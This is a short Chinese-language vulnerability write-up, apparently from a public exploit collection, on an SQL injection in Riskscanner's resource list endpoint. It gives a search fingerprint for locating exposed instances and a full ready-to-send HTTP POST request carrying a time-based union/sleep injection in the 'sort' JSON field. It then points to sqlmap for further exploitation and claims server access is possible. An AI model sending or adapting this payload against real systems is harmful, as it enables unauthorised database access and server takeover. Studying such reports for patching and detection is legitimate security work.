# Riskscanner list SQL注入漏洞

## 漏洞描述

Riskscanner list接口存在SQL注入漏洞，通过漏洞可获取服务器权限

## 漏洞影响

```
Riskscanner
```

## 网络测绘

```
title="Riskscanner"
```

## 漏洞复现

登录页面



![](images/202202101940023.png)



发送漏洞请求包



```plain
POST /resource/list/1/10 HTTP/1.1
Host: 
Content-Length: 41
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36
Content-Type: application/json;charset=UTF-8

{"sort":"1)a union select sleep(5) -- -"}
```



![](images/202202101940005.png)



使用工具Sqlmap



![](images/202202101940424.png)